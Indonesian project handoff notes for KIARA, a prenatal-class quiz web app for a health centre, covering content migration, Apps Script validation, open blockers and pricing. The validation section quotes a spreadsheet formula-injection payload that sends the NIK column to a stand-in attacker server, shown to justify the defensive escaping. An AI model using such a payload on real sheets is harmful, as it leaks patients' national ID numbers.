# Catatan Sesi — KIARA

Rekaman keadaan proyek untuk dilanjutkan di sesi berikutnya.
Terakhir diperbarui: **5 Agustus 2026**, commit `9635e73`.

---

## 1. Identitas proyek

| | |
|---|---|
| Nama | KIARA — Kelas Ibu Hamil Digital |
| Klien | Puskesmas Kecamatan Cakung |
| Alur inti | Pasien scan QR di ruang tunggu → isi NIK → aplikasi kenali riwayat → tentukan sesi ke berapa → pre-test → materi → post-test → simpan ke Google Sheet |
| Folder | `dashboard/kiara-puskes-cakung/` |
| Repo | https://github.com/iamsleepyhead00/kiara-puskes-cakung (publik) |
| Spreadsheet | "Rekap Hasil Kiara 2026", tab `KIARA` |
| Endpoint | lihat `SHEETS_ENDPOINT` di `config.js` |
| Server preview | `python -m http.server 8000` di folder proyek |

**Dokumen acuan alur:** `konsep KIARA.docx` (2 Agu 2026). Menggantikan
`FORMAT KIARA.docx` (31 Jul) — yang lama jangan dipakai lagi. Dokumen sumber
pernah diedit klien saat sedang dianalisis, jadi bisa berubah lagi.

**Sumber konten:** folder `DATA BASE VIDEO-20260805T145907Z-1-001` di Downloads
(5 Agu 2026) — 6 video + 9 berkas soal, prefiks `K.1`–`K.4` = kunjungan 1–4.
Ini menggantikan bank soal Buku Pegangan Fasilitator dan paket video TTD/MMS.

---

## 2. Status sekarang

**Yang sudah jalan dan terverifikasi:**

- Backend Apps Script **versi 5** sudah ter-deploy dan aktif
- Validasi ketat live — diuji: skor 90 ditolak `"Post-Test harus kelipatan 20"`, skor 80 diterima
- Simpan dan lookup ke sheet berhasil (13 kolom, satu baris per kunjungan)
- Clamp KKM terbukti: kirim `kkm=0` tetap menghasilkan `BELUM`, bukan `LULUS`
- Anti-injeksi formula terbukti: `=CONCATENATE(E2:E50)` tersimpan sebagai teks, bukan formula
- `OFFLINE_MODE: false` — aplikasi tersambung ke sheet sungguhan
- Favicon ikon bayi di tab browser

**Berubah 5 Agustus:** puskesmas mengirim folder `DATA BASE VIDEO` — 6 video
(186 MB) + 9 berkas soal, diberi prefiks K.1–K.4 untuk kunjungan 1–4. Ini
mengganti seluruh sumber konten sebelumnya. Blocker video praktis selesai:
1.122 MB → 186 MB, berkas terbesar 68 MB (di bawah batas 100 MB GitHub).

**Yang belum bisa dipakai pasien:** kunci jawaban belum diverifikasi bidan.
Lihat bagian Blocker.

---

## 3. Keputusan yang sudah dipatok klien

Jangan diubah tanpa instruksi baru.

| Hal | Keputusan |
|---|---|
| Sesi aktif | **hanya 1–4** = kunjungan K.1–K.4 di folder puskesmas |
| Sumber konten | folder **DATA BASE VIDEO** (5 Agu). Menggantikan bank soal buku fasilitator + paket video TTD/MMS |
| Topik per kunjungan | **2 topik**, masing-masing 1 video + 1 set 5 soal |
| Soal per kunjungan | **10 soal** Benar/Salah (2 topik × 5), digabung jadi satu pre-test dan satu post-test |
| KKM | **80** = lulus 8 dari 10 benar |
| Materi PDF | **tidak dipakai** (slide + komik). Definisi disimpan di `materiDitahan`, file PDF sudah dihapus dari disk — bisa dibuat ulang dari zip di Downloads |
| Sertifikat kelulusan | **DI-HOLD**. Jangan dibangun. Layar S13 dan `ENABLE_SERTIFIKAT` sudah dicabut |
| Struktur sheet | **13 kolom datar**, ditetapkan puskesmas. Jangan diubah |
| Tombol kirim WA | **tidak muncul** kalau belum capai KKM. Sekarang hanya ada di S8 dan S10 |
| Tombol "Materi Berikutnya" | **disembunyikan**, bukan diredam, sampai materi tuntas |
| Dropdown | placeholder wajib jadi nilai awal, tapi **tidak boleh muncul sebagai baris** di daftar (pakai atribut `hidden`) |
| Nomor WA tujuan | `085889945829` (bukan yang lama `085945371933`) |
| Keamanan endpoint | risiko diterima selama masa uji, repo tetap publik |

---

## 4. Yang dikerjakan di sesi ini

### Migrasi ke folder DATA BASE VIDEO — 5 Agustus

Puskesmas mengirim `DATA BASE VIDEO-20260805T145907Z-1-001`: 6 mp4 + 9 .docx
soal. Prefiks `K.1`–`K.4` = kunjungan 1–4. Isinya:

| Kunj. | Topik | Video | Soal |
|---|---|---|---|
| 1 | Tanda Kehamilan | 9 MB | 5 |
| 1 | 1000 HPK | 51 MB | 5 |
| 2 | Gizi Ibu Hamil | 68 MB | 5 |
| 2 | Ibu KEK | 42 MB | 5 |
| 3 | Perawatan Sehari-hari | 4 MB | 5 |
| 3 | Mitos dan Fakta | **✗** | 5 |
| 4 | Hal yang Harus Dihindari | 13 MB | 5 |
| 4 | Tanda Bahaya Hamil | **✗** | 5 |
| — | Imunisasi (tanpa prefiks K) | ✗ | 5 |

**Dua topik per kunjungan, jadi 10 soal per kunjungan, bukan 5.** Ini berbeda
dari asumsi 4 Agustus. Sepuluh soal digabung jadi **satu** pre-test dan **satu**
post-test supaya struktur 13 kolom sheet tetap utuh — satu baris per kunjungan,
satu `skorPre`, satu `skorPost`. Kalau tiap topik dites terpisah, butuh 4 kolom
skor per baris dan strukturnya pecah.

Konsekuensinya poin per soal jadi 10 (bukan 20) dan skor bisa 0–100 kelipatan 10.
KKM tetap 80, sekarang berarti 8 dari 10 benar.

Yang berubah:

| File | Perubahan |
|---|---|
| `content.js` | ditulis ulang. `materi` = 6 video baru; `setSoal` = 8 set berkunci topik (`K1_TANDA_KEHAMILAN`, `K1_1000HPK`, …) menggantikan set angka 1–4 |
| `content.js` | bank soal buku fasilitator + paket TTD/MMS dipindah ke `setSoalDitahan` / `materiDitahan`, tidak dihapus |
| `content.js` | `sesi[].setSoal` sekarang **array** kunci topik, bukan angka. `bagianSoal` dicabut — tidak ada lagi pembelahan 10 soal jadi dua |
| `app.js` | `soalSesi()` menggabungkan semua set dalam array dan menempelkan `topik` ke tiap soal. `kunciSetSoal()` baru sebagai normalisasi |
| `app.js` | kartu soal berlabel topiknya sendiri, bukan gabungan nama set — satu kunjungan punya dua topik, pasien perlu tahu yang mana |
| `app.js` | `peringatanKonfigurasi()` sekarang memperingatkan kunci turunan, topik tanpa video, dan jumlah soal per sesi yang tidak sama dengan `SOAL_PER_SESI` |
| `config.js` | `SOAL_PER_SESI: 5 → 10` |
| `gas/Code.gs` | `POIN_PER_SOAL: 20 → 10` |
| `index.html` | `config.js?v=7`, `content.js?v=7`, `app.js?v=16` |

Verifikasi otomatis lolos semua: 4 sesi × 10 soal, tanpa soal terulang, semua
kunci boolean, 6 berkas media ada di disk, skor selalu kelipatan 10.

**Wilayah TTD/MMS jadi tidak relevan untuk kunjungan 1–4.** Paket baru tidak
terbagi wilayah — satu set saja. Menariknya tiga video baru identik byte-per-byte
(diverifikasi MD5) dengan varian **MMS** yang lama:

```
MMS/1-Video-Gizi-1000-Hari.mp4   = K1-Gizi-1000-HPK.mp4
MMS/3-Video-Gizi-Ibu-Hamil.mp4   = K2-Gizi-Ibu-Hamil.mp4
2-Video-Audio-KEK.mp4            = K2-KEK.mp4
```

Jadi kurasi puskesmas memakai varian MMS. Belum cukup untuk menyimpulkan Cakung
masuk program MMS — tapi satu soal K.1 ("semua ibu hamil dapat TTD") jawabannya
bergantung ini, jadi tetap perlu ditanyakan.

### Validasi ketat di Apps Script — commit `f021527`

Endpoint terbuka untuk siapa pun yang punya URL, jadi tidak boleh mempercayai
apa pun dari klien. Ditambahkan di `gas/Code.gs`:

| Fungsi | Peran |
|---|---|
| `validasiSimpan()` | periksa semua field: NIK 16 digit, nama 3–80 tanpa HTML/URL, WA `^0\d{8,14}$`, alamat 5–200, kelurahan & puskesmas harus dari daftar resmi, kunjungan 1–10, skor 0–100 kelipatan `POIN_PER_SOAL` |
| `amanTeks()` | netralkan injeksi formula Sheets — nilai berawalan `=` `+` `-` `@` diberi prefiks apostrof |
| `tanpaApostrof()` | lepas prefiks itu saat data dibaca kembali ke aplikasi |
| `dalamRentang()` | clamp `kkm` dan `totalSesi`, supaya klien tidak bisa kirim `kkm=0` agar semua LULUS |
| `lolosThrottle()` | batas 40 simpan / 10 menit lewat `ScriptProperties`, dipanggil di dalam lock |
| `ujiValidasi()` | 16 payload buruk dilempar ke validator, tidak menulis apa pun ke sheet |

Urutan di `handleSave`: validasi (di luar lock, murni hitungan) → lock →
`bedaHeader` → throttle → tulis.

Injeksi formula itu risiko nyata justru karena bidan membuka spreadsheet.
Payload `=IMPORTXML("https://server-penyerang/?d="&CONCATENATE(E2:E50),"//a")`
di kolom Nama bisa mengirim seluruh kolom NIK keluar begitu file dibuka.

Di `index.html`, input Nama diberi `maxlength="80"` dan Alamat `maxlength="200"`
supaya form tidak bisa menghasilkan nilai yang ditolak server.

### 5 soal per sesi, KKM 80 — commit `1c4463c`

Klien konfirmasi tiap sesi hanya 5 soal dan lulus 4 dari 5. Buku fasilitator
berisi 10 soal per pertemuan, jadi tiap set dibelah lewat `bagianSoal`:

| Sesi | Set buku | Bagian | Soal buku |
|---|---|---|---|
| 1 · Kehamilan Sehat | Pertemuan I | 1 | 1–5 |
| 2 · Pemeriksaan & Gizi | Pertemuan I | 2 | 6–10 |
| 3 · Perawatan Diri | Pertemuan III | 1 | 1–5 |
| 4 · Tanda Bahaya | Pertemuan III | 2 | 6–10 |

Sebelumnya sesi 1 & 2 memakai set yang sama persis sehingga soalnya terulang.
Sekarang tidak — sudah diuji, sesi 1–4 dapat 5 soal masing-masing tanpa
tumpang tindih, di wilayah TTD maupun MMS.

Skala skor jadi kelipatan 20: `0, 20, 40, 60, 80, 100`. Yang berubah:

- `config.js` → `SOAL_PER_SESI: 5` (baru), `KKM: 75 → 80`
- `app.js` → `soalSesi()` memotong 5 soal, `namaSet()` menyebut rentang soalnya
- `gas/Code.gs` → `POIN_PER_SOAL: 10 → 20`, `KKM_DEFAULT: 75 → 80`
- `hitungSkor()` **tidak disentuh** — rumusnya `benar / soal.length × 100`, otomatis ikut

### Favicon — commit `9635e73`

`icons/favicon.svg`, ikon Lucide `baby` yang sama dengan splash screen. Digambar
sebagai kotak berisi `#b03a5b` dengan bayi krem di atasnya, karena garis tipis
Lucide nyaris tidak terlihat di ukuran 16px dan warnanya ambigu di tab gelap
maupun terang. Path diverifikasi 4 dari 4 cocok dengan rilis Lucide resmi.

Catatan: `apple-touch-icon` diarahkan ke SVG yang sama, tapi Safari tidak
mendukung SVG untuk ikon home-screen. Kalau nanti perlu, butuh PNG 180×180
plus `manifest.json` agar jadi PWA.

---

## 5. Blocker — aplikasi belum bisa dipakai pasien

### 5.1 Kunci jawaban belum diverifikasi bidan — blocker utama sekarang

Sembilan berkas .docx dari puskesmas hanya memuat pertanyaan dan pilihan
"Benar/Salah". **Tidak ada tanda mana jawaban yang benar.**

Aplikasi butuh kunci untuk menghitung skor, jadi 45 kunci diturunkan dari
pedoman Buku KIA dan standar ANC, semuanya ditandai `kunciTurunan: true` di
`content.js`. Sebagian besar tidak ambigu ("Boleh minum alkohol selama hamil"
jelas Salah), tapi kunci turunan tetap bukan kunci resmi — kalau ada yang
salah, skor dan status LULUS ikut salah.

Daftar cetaknya sudah disiapkan di `KUNCI-JAWABAN-PERLU-VERIFIKASI.md` —
tinggal dikirim ke bidan untuk dicoret-koreksi.

Tiga kunci yang jawabannya bergantung pedoman, bukan fakta medis:

| Soal | Kunci turunan | Kenapa perlu ditanya |
|---|---|---|
| K.1 Tanda Kehamilan no. 4 — "trimester kedua 1 kali" | Benar | Benar di standar ANC 6× (TM1 2×, TM2 1×, TM3 3×). Beda kalau puskesmas masih pakai standar 4× |
| K.1 Tanda Kehamilan no. 5 — "semua ibu hamil dapat TTD" | Benar | Di wilayah MMS mereka dapat MMS, bukan TTD |
| K.4 Hal Dihindari no. 1 — "kopi tidak lebih dari 1 cangkir" | Benar | Pedoman membatasi kafein tapi angka "1 cangkir" tidak baku |

### 5.2 Dua topik punya soal tapi tidak ada videonya

| Kunjungan | Topik | Soal | Video |
|---|---|---|---|
| 3 | Mitos dan Fakta | 5 | **tidak ada** |
| 4 | Tanda Bahaya Hamil | 5 | **tidak ada** |

Pasien akan diuji tanpa menonton materinya. Untuk kunjungan 3 ada kandidat dari
paket lama: `TTD/7-Video-TTD-Mitos-dan-Fakta.mp4` (99 MB) — isinya persis cocok,
soal K.3 Mitos dan Fakta memang soal anemia dan mitos TTD. **Tidak diaktifkan**
karena puskesmas sengaja tidak memasukkannya ke folder baru. Kalau disetujui,
pindahkan entrinya dari `materiDitahan` ke `materi` lalu daftarkan di
`sesi[2].materi` — satu baris.

Untuk kunjungan 4 tidak ada kandidat sama sekali.

### 5.3 Video masih dikecualikan dari git

`.gitignore` masih memblokir semua `media/**/*.mp4`. Alasannya sudah berubah:
paket baru cuma **186 MB** dengan berkas terbesar 68 MB, semuanya lolos batas
100 MB/berkas GitHub. Dulu 1.122 MB dengan dua berkas 366 MB dan 309 MB yang
ditolak keras.

Hitungan bandwidth jadi masuk akal: 186 MB per ibu untuk 4 kunjungan, kuota
GitHub Pages 100 GB/bulan → **±537 ibu/bulan**. Dulu hanya ±111.

Artinya YouTube tidak wajib lagi — video bisa langsung ikut repo. **Belum
dilakukan** karena sekali di-push, blob 186 MB itu permanen di riwayat git dan
repo masih publik. Perlu keputusan user dulu.

Kalau setuju, tambahkan pengecualian di `.gitignore`:

```gitignore
!media/K1-Tanda-Kehamilan.mp4
!media/K1-Gizi-1000-HPK.mp4
!media/K2-Gizi-Ibu-Hamil.mp4
!media/K2-KEK.mp4
!media/K3-Perawatan-Sehari-hari.mp4
!media/K4-Hal-yang-Dihindari.mp4
```

Alternatifnya tetap YouTube unlisted (butuh izin puskesmas) atau Cloudflare
Pages / R2. Anti-skip sudah siap untuk keduanya: `controls:0` + `disablekb:1`
untuk YouTube, `controls=false` untuk mp4. Kalau pindah ke YouTube, ubah
`content.js` ke `tipe:'youtube'` dan isi ID videonya.

### 5.4 GitHub Pages belum diaktifkan

Settings → Pages → main / root.

### 5.5 Duplikat media 160 MB

Tiga berkas paket lama identik byte-per-byte dengan berkas baru (lihat bagian 4).
`MMS/1-Video-Gizi-1000-Hari.mp4`, `MMS/3-Video-Gizi-Ibu-Hamil.mp4`, dan
`2-Video-Audio-KEK.mp4` boleh dihapus untuk menghemat 160 MB disk. Tidak dihapus
sendiri karena `media/` isinya aset klien.

---

## 6. Menunggu jawaban puskesmas

| # | Hal | Kondisi sekarang |
|---|---|---|
| 1 | **Verifikasi 45 kunci jawaban** | diturunkan sendiri dari pedoman, ditandai `kunciTurunan`. Daftar cetak siap di `KUNCI-JAWABAN-PERLU-VERIFIKASI.md`. Lihat 5.1 |
| 2 | Video untuk topik "Mitos dan Fakta" (K.3) | tidak ada. Kandidat `VID_MITOS_TTD` 99 MB, belum diaktifkan. Lihat 5.2 |
| 3 | Video untuk topik "Tanda Bahaya Hamil" (K.4) | tidak ada, tanpa kandidat |
| 4 | Soal "Imunisasi" masuk kunjungan ke berapa | berkasnya tanpa prefiks K. Ditahan di `setSoalDitahan` |
| 5 | Wilayah **TTD atau MMS** | tidak lagi memengaruhi materi (paket baru satu set), tapi masih memengaruhi kunci soal K.1 no. 5. `config.js` masih `TTD` |
| 6 | Kunjungan 5+ | puskesmas baru mengirim K.1–K.4. `sesiDitahan` sekarang kosong |
| 7 | Template pesan WhatsApp | dikarang sendiri |
| 8 | Video ikut repo publik atau YouTube unlisted | perlu keputusan user + izin puskesmas. Lihat 5.3 |

Konten kesehatan tidak pernah dikarang. Kunci jawaban diturunkan karena berkas
sumber memang tidak memuatnya, dan semuanya ditandai untuk diverifikasi — bukan
dianggap final.

---

## 7. Yang perlu dilakukan user

| # | Tindakan | Catatan |
|---|---|---|
| 1 | **Deploy versi baru Apps Script** | `POIN_PER_SOAL` sudah diubah 20 → 10 di `gas/Code.gs`. Kalau belum di-deploy, endpoint menolak skor 10/30/50/70/90 — sebagian pasien gagal simpan. Copy `Code.gs` → Deploy → Manage deployments → Edit → New version |
| 2 | Kirim `KUNCI-JAWABAN-PERLU-VERIFIKASI.md` ke bidan | blocker utama, lihat 5.1 |
| 3 | Jalankan `hapusUji()` di Apps Script | Ada 1 baris uji NIK `9999999999999999` sisa verifikasi terakhir |
| 4 | Putuskan hosting video: ikut repo atau YouTube | 186 MB sudah lolos batas GitHub, lihat 5.3 |
| 5 | Tanya puskesmas soal 2 topik tanpa video | lihat 5.2 |
| 6 | Aktifkan GitHub Pages | Settings → Pages → main / root |
| 7 | Ganti deployment Apps Script atau jadikan repo private | **sebelum** dipakai pasien nyata |
| 8 | Tulis batas scope + termin bayar ke klien | lihat bagian 9 |
| 9 | Hapus 3 video duplikat (160 MB) | opsional, lihat 5.5 |
| 10 | Pindahkan repo keluar folder kantor | opsional, lihat bagian 8 |

---

## 8. Keamanan dan lingkungan

**Endpoint terbuka.** URL Web App memberi akses tulis ke sheet bagi siapa pun
yang memilikinya. Aplikasi statis berarti URL selalu terlihat di DevTools, dan
repo publik berarti bisa ditemukan pemindai otomatis GitHub.

Selama masa uji risiko ini diterima user. Peredam yang sudah dipasang (validasi,
clamp, throttle, anti-injeksi) hanya mencegah data ngawur dan banjir — **bukan
menutup akses**. Sebelum pasien nyata, lakukan salah satu:

- Apps Script → Deploy → Manage deployments → Edit → New version (URL berubah,
  lalu perbarui `SHEETS_ENDPOINT` di `config.js`)
- atau jadikan repo private

**NIK disimpan mentah** sesuai struktur yang diminta puskesmas. Spreadsheet
jangan pernah dibagikan dengan opsi "anyone with the link" — share ke akun bidan
tertentu saja. Di pesan WhatsApp NIK ditampilkan tersamar (`3175••••••••1234`).

**Repo masih di dalam folder kantor.** `c:\KIRO AKUH\sinta\` remote-nya GitLab
kantor (`mitrakeluarga/sinta`), dan KIARA jadi repo terpisah di dalamnya.
Identitas git lokal KIARA sudah di-set ke akun pribadi
(`iamsleepyhead00 <iamsleepyhead00@users.noreply.github.com>`) — **sengaja tidak
memakai identitas kantor** yang ada di repo induk. Config global mesin tidak
disentuh. `media/` (1.122 MB) sudah diverifikasi tidak ikut ter-push.

---

## 9. Catatan komersial

Penawaran awal 4jt → didiskon 3jt → klien menawar **1jt** (setara Rp 95rb/hari
untuk 10,5 hari kerja). User mengambil proyeknya karena butuh cash.

**Belum dilakukan:** menulis batas scope dan termin bayar ke klien di WhatsApp.
Ini makin relevan karena scope sudah bertambah banyak sejak kesepakatan 1jt:
anti-skip video, validasi ketat backend, migrasi struktur 13 kolom, perombakan
tampilan, ganti skema soal jadi 5/KKM 80, favicon.

Semua itu di luar penawaran awal. Tanpa batas tertulis, permintaan berikutnya
akan dianggap "masih termasuk". Minimal tulis: apa yang masuk, apa yang di luar
(sertifikat, upload video, revisi materi), dan DP 50%.

Klien tidak paham IT, jadi saran sebelumnya: tanyakan asal angka 1jt — kemungkinan
itu plafon mekanisme pembayaran, bukan plafon nilai proyek.

---

## 10. Konvensi kerja

- Balas dalam **Bahasa Indonesia informal**, sapaan "lu/gw"
- Jangan bertele-tele, tapi tetap teliti
- **Jangan menambahkan file uji permanen.** Buat file `_*.js` atau `_*.ps1`
  sementara, jalankan, lalu hapus
- Output PowerShell sering terpotong — tulis hasil ke file lalu `Get-Content`
- Uji endpoint Apps Script pakai `curl.exe -sL`, **bukan** `Invoke-RestMethod`
  (balas 404 palsu untuk request berparameter)
- Google kadang membalas halaman HTML "Halaman Tidak Ditemukan" alih-alih JSON.
  Itu gangguan sesaat, ulangi requestnya
- Naikkan `?v=` di `index.html` setiap JS/CSS berubah. Sekarang:
  `style.css?v=9`, `config.js?v=7`, `content.js?v=7`, `visit-tracker.js?v=4`,
  `app.js?v=16`
- **Jangan mengarang konten kesehatan.** Kunci jawaban yang terlihat keliru
  ditulis apa adanya lalu ditandai `perluKonfirmasi`
- Jangan pakai identitas git kantor untuk repo pribadi user
- Jangan mengubah struktur 13 kolom sheet
- PowerShell membalas exit code 1 saat `git push` walau berhasil — itu kuirk
  penanganan stderr, cek `main ->` di outputnya

---

## 11. Peta file

| File | Isi |
|---|---|
| `index.html` | 13 layar (S1–S12), markup semua screen |
| `style.css` | palet plum-wine `#b03a5b`, 9 token ukuran teks (`--t-micro` … `--t-logo`) |
| `config.js` | satu-satunya file yang perlu diubah saat deploy |
| `content.js` | peta kunjungan 1–4, 6 video, 8 set soal ×5, `materiDitahan` + `setSoalDitahan` (paket lama & buku fasilitator), template WA |
| `visit-tracker.js` | lookup/save, mode offline, validasi NIK & HP |
| `app.js` | seluruh logika layar, `soalSesi()`, `hitungSkor()`, anti-skip |
| `gas/Code.gs` | backend Apps Script, validasi, uji `ujiTulis`/`ujiBaca`/`ujiValidasi`/`hapusUji` |
| `icons/favicon.svg` | ikon bayi untuk tab |
| `STRUKTUR-GOOGLE-SHEET.md` | 13 kolom, aturan validasi, 9 rumus rekap untuk bidan |
| `BATAS-MEDIA-GITHUB.md` | analisis batas media. ⚠️ angkanya untuk paket lama 1.122 MB, sudah tidak berlaku — paket baru 186 MB |
| `KUNCI-JAWABAN-PERLU-VERIFIKASI.md` | 45 soal + kunci turunan, untuk dicoret-koreksi bidan |
| `README.md` | ikhtisar, alur layar, tabel pertanyaan terbuka |
| `media/` | 6 video aktif (186 MB) + 11 video paket lama, **semua tidak ikut git** |
